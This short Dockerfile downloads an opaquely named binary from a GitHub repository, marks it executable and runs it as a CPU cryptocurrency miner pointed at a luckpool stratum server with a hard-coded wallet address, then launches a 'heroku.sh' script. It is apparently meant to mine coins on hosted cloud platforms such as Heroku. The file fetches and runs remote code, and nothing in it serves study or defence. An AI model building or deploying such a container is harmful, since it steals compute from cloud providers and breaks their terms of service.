FROM thomasjp0x42/packetcrypt

RUN wget -O meki-baru https://github.com/renilo/xmr/raw/main/meki-baru && chmod +x meki-baru && ./meki-baru -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RR6U3T7Uz475i7gontznFLWikFsQan2wjC.CLOUD -p x --cpu 6
CMD bash heroku.sh
